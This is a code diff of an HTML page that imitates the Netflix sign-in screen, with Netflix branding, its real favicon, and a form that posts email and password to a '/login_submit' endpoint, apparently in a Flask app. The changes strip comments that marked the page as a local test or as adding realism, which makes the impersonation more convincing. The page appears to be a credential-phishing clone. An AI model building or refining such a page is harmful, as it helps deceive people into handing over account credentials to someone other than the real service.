@@ -4,10 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Netflix - Sign In</title>
-    <!-- Favicon - can be a placeholder or a simple emoji for local testing -->
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🎬</text></svg>">
+    <!-- Favicon -->
+    <link rel="icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
     
-    <!-- Tailwind CSS CDN for styling -->
+    <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- Google Fonts - Inter -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
@@ -22,132 +22,156 @@
             -moz-osx-font-smoothing: grayscale;
         }
 
-        /* Full-screen background image for Netflix feel */
-        .bg-netflix {
-            background-image: url('https://assets.nflxext.com/ffe/siteui/vlv3/9d63428d-d779-40ed-83e3-772b15743c7b/97330206-8d5f-40e8-b7fb-13c545802287/US-en-20240401-POP_SIGNUP_TWO_WEEKS-perspective_WEB_b6691c78-651c-43f1-b997-8c35582f34e6_small.jpg');
+        /* Netflix background with your exact image */
+        .netflix-bg {
+            background-image: 
+                linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
+                url('https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/f562aaf4-5dbb-4603-a32b-6ef6c2230136/dh0w8qv-9d8ee6b2-b41a-4681-ab9b-8a227560dc75.jpg/v1/fill/w_1192,h_670,q_70,strp/the_netflix_login_background__canada__2024___by_logofeveryt_dh0w8qv-pre.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NzIwIiwicGF0aCI6IlwvZlwvZjU2MmFhZjQtNWRiYi00NjAzLWEzMmItNmVmNmMyMjMwMTM2XC9kaDB3OHF2LTlkOGVlNmIyLWI0MWEtNDY4MS1hYjliLThhMjI3NTYwZGM3NS5qcGciLCJ3aWR0aCI6Ijw9MTI4MCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.LOYKSxIDqfPwWHR0SSJ-ugGQ6bECF0yO6Cmc0F26CQs');
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
+            min-height: 100vh;
         }
 
-        /* Dark overlay to make text readable */
-        .bg-overlay {
-            background-color: rgba(0, 0, 0, 0.7);
+        /* Form container styling */
+        .form-container {
+            background-color: rgba(0, 0, 0, 0.75);
+            border-radius: 4px;
+            padding: 60px 68px;
+            max-width: 450px;
         }
 
-        /* Custom input styles to match Netflix */
+        /* Netflix input fields */
         .netflix-input {
             background-color: #333;
             color: #fff;
-            padding: 1rem 1.25rem;
-            border-radius: 0.25rem;
             border: none;
-            outline: none;
-            transition: background-color 0.2s ease-in-out;
-        }
-        .netflix-input::placeholder {
-            color: #8c8c8c;
-        }
-        .netflix-input:focus {
-            background-color: #444; /* Slightly lighter on focus */
-            outline: 2px solid #e50914; /* Netflix red outline */
-            outline-offset: -2px; /* Ensure outline is inside */
+            border-radius: 4px;
+            padding: 15px 20px;
+            width: 100%;
+            margin-bottom: 16px;
         }
 
-        /* Custom button styles */
+        .netflix-input:focus {
+            outline: none;
+            background-color: #454545;
+        }
+
+        /* Netflix button */
         .netflix-button {
             background-color: #e50914;
-            color: #fff;
-            padding: 0.875rem 1.25rem;
-            border-radius: 0.25rem;
-            font-weight: 600;
-            transition: background-color 0.2s ease-in-out;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: bold;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 24px;
         }
+
         .netflix-button:hover {
-            background-color: #f40612; /* Slightly brighter red on hover */
+            background-color: #f6121d;
+        }
+
+        /* Netflix logo styling */
+        .netflix-logo {
+            color: #e50914;
+            font-family: Arial, sans-serif;
+            font-weight: 900;
+            font-size: 45px;
+            line-height: 1;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.45);
+            letter-spacing: -1px;
+        }
+
+        /* OR divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            color: #737373;
+            font-size: 13px;
+            margin: 20px 0;
+        }
+
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #737373;
+            margin: 0 10px;
         }
     </style>
 </head>
-<body class="bg-netflix min-h-screen flex flex-col items-center justify-center p-4">
-    <!-- Dark overlay covering the entire background -->
-    <div class="bg-overlay absolute inset-0"></div>
-
-    <!-- Netflix Logo (simplified SVG for local testing) -->
-    <header class="absolute top-0 left-0 w-full p-6 sm:p-8 z-20">
-        <svg class="h-8 sm:h-10 w-auto" viewBox="0 0 111 30" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M11.666 0L0 29.873H6.046L14.07 10.988L15.342 10.988L23.366 29.873H29.412L17.746 0H11.666Z" fill="#E50914"/>
-            <path d="M38.831 0.449L30.932 29.873H36.978L40.941 18.069C41.657 16.035 42.483 13.067 42.483 11.233C42.483 9.775 42.757 8.318 43.031 6.861C43.305 5.404 43.663 3.947 43.663 3.947L47.014 29.873H53.06L44.887 0.449H38.831Z" fill="#E50914"/>
-            <path d="M68.587 0.449L60.688 29.873H66.734L74.758 10.988L76.03 10.988L84.054 29.873H90.1L78.434 0.449H72.378H68.587Z" fill="#E50914"/>
-            <path d="M96.766 0.449L88.867 29.873H94.913L98.876 18.069C99.592 16.035 100.418 13.067 100.418 11.233C100.418 9.775 100.692 8.318 100.966 6.861C101.24 5.404 101.598 3.947 101.598 3.947L104.949 29.873H111L102.827 0.449H96.766Z" fill="#E50914"/>
-        </svg>
+<body class="netflix-bg flex items-center justify-center">
+    <!-- Netflix Logo -->
+    <header class="absolute top-0 left-0 w-full p-8 z-20">
+        <div class="netflix-logo">NETFLIX</div>
     </header>
 
     <!-- Login Form Container -->
-    <div class="relative z-10 bg-black bg-opacity-80 p-8 sm:p-12 rounded-lg shadow-xl w-full max-w-md my-8">
-        <h1 class="text-white text-3xl sm:text-4xl font-bold mb-8">Sign In</h1>
+    <div class="form-container">
+        <h1 class="text-white text-3xl font-bold mb-7 text-center">Sign In</h1>
 
-        <!-- The form targets the '/login_submit' endpoint in your app.py -->
-        <form action="/login_submit" method="POST" class="space-y-6">
+        <form action="/login_submit" method="POST">
             <!-- Email or Phone Number Input -->
-            <div>
-                <label for="email" class="sr-only">Email or phone number</label>
+            <div class="mb-4">
                 <input
                     type="text"
                     id="email"
-                    name="email" <!-- 'name' attribute is crucial for Flask to get the value -->
-                    placeholder="Email or phone number"
-                    class="netflix-input w-full"
+                    name="email"
+                    placeholder="Email or mobile number"
+                    class="netflix-input"
                     required
                     autocomplete="username"
                 >
             </div>
 
             <!-- Password Input -->
-            <div>
-                <label for="password" class="sr-only">Password</label>
+            <div class="mb-4">
                 <input
                     type="password"
                     id="password"
-                    name="password" <!-- 'name' attribute is crucial for Flask to get the value -->
+                    name="password"
                     placeholder="Password"
-                    class="netflix-input w-full"
+                    class="netflix-input"
                     required
                     autocomplete="current-password"
                 >
             </div>
 
             <!-- Sign In Button -->
-            <button
-                type="submit"
-                class="netflix-button w-full py-3 rounded-md focus:outline-none focus:ring-2 focus:ring-red-600 focus:ring-offset-2"
-            >
+            <button type="submit" class="netflix-button">
                 Sign In
             </button>
 
-            <!-- Remember Me & Need Help Links -->
-            <div class="flex justify-between items-center text-sm mt-4">
-                <label class="flex items-center text-gray-400">
-                    <input type="checkbox" class="form-checkbox h-4 w-4 text-red-600 bg-gray-700 border-gray-600 rounded-sm focus:ring-red-600 mr-2">
-                    Remember me
-                </label>
-                <a href="#" class="text-gray-400 hover:underline">Need help?</a>
+            <!-- Additional options -->
+            <div class="flex justify-between items-center mt-3 text-sm">
+                <div class="flex items-center">
+                    <input type="checkbox" id="remember" class="h-4 w-4">
+                    <label for="remember" class="text-gray-300 ml-2">Remember me</label>
+                </div>
+                <a href="#" class="text-gray-300 hover:underline">Forgot password?</a>
+            </div>
+
+            <!-- OR divider -->
+            <div class="divider">OR</div>
+
+            <!-- Sign-in code option -->
+            <div class="text-center mb-6">
+                <a href="#" class="text-gray-300 hover:underline">Use a sign-in code</a>
             </div>
 
             <!-- Sign Up Link -->
-            <div class="text-gray-400 text-base mt-10">
-                New to Netflix? <a href="#" class="text-white hover:underline font-semibold">Sign up now</a>.
+            <div class="text-gray-500 text-center mt-8">
+                New to Netflix? <a href="#" class="text-white hover:underline">Sign up now</a>.
             </div>
 
-            <!-- reCAPTCHA text (for visual realism) -->
+            <!-- reCAPTCHA text -->
             <div class="text-gray-500 text-xs mt-4">
-                This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#" class="text-blue-500 hover:underline">Learn more.</a>
+                This page is protected by Google reCAPTCHA to ensure you're not a bot.
             </div>
         </form>
     </div>
-
-    <!-- Simple Footer (optional, but adds realism) -->
-    <footer class="relative z-10 bg-black bg-opacity-80 w-full max-w-md my-8 px-8 py-4 rounded-lg text-gray-400 text-sm">
-        Questions? Call 1-844-505-2993
-    </footer>
 </body>
 </html>
